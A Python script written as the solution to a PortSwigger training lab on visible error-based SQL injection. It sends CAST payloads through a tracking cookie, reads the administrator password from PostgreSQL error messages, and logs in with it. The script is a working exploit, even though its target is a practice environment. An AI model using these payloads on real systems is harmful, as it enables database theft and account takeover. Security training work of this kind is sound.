import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup
import re

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based
# db: PostgreSQL
# author: 0xyf


class SQLi13:
    def __init__(self):
        self.lab_id = "0a9a00450318156c8136dfdd005900c4"
        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.login_url = f"{self.url}/login"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.username = "administrator"
        self.table = "users"

    def get_csrf_token(self):
        r = requests.get(f"{self.login_url}")
        soup = BeautifulSoup(r.text, "html.parser")
        self.csrf_token = soup.find("input", attrs={"name": "csrf"})["value"]
        self.cookies = r.cookies

    def execute_request(self, payload):
        cookies = {"TrackingId": payload}
        r = requests.get(
            f"{self.url}", cookies=cookies, proxies=self.proxies, verify=False
        )
        return r

    def check_user_tbl_exists(self):
        payload = f"' AND 1=CAST((SELECT username FROM {self.table}) AS int)--"
        r = self.execute_request(payload)
        if r.status_code == 500:
            if "more than one" in r.text:
                print("[*] user table exists")
                return True

    def check_username_exists(self):
        payload = (
            f"' AND 1=CAST((SELECT {self.username} FROM {self.table} LIMIT 1) AS int)--"
        )
        r = self.execute_request(payload)
        if r.status_code == 500:
            if "invalid input syntax for type integer":
                print("[*] user administrator exists")
                return True

    def get_creds(self):
        payload = f"' AND 1=CAST((SELECT password FROM {self.table} LIMIT 1) AS int)--"
        r = self.execute_request(payload)
        if r.status_code == 500:
            pattern = r"invalid input syntax for type integer: \"(.*)\""
            match = re.search(pattern, r.text)
            if match:
                self.password = match.group(1)
                print(
                    f"[*] creds: {self.username}:{match.group(1)}"
                )  # Use group(1) to get the content inside parentheses

    def login(self):
        self.get_csrf_token()
        print(f"[*] Attempting to Login as {self.username}:{self.password}")
        data = {
            "username": self.username,
            "password": self.password,
            "csrf": self.csrf_token,
        }
        r = requests.post(
            self.login_url,
            cookies=self.cookies,
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        if r.status_code == 200:
            if "Invalid username or password." not in r.text:
                print(f"[*] valid combination {self.username}:{self.password}")

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        if self.check_user_tbl_exists():
            if self.check_username_exists():
                self.get_creds()
                self.login()
                self.check_solved()


def main():
    SQLi13().solve()


if __name__ == "__main__":
    main()
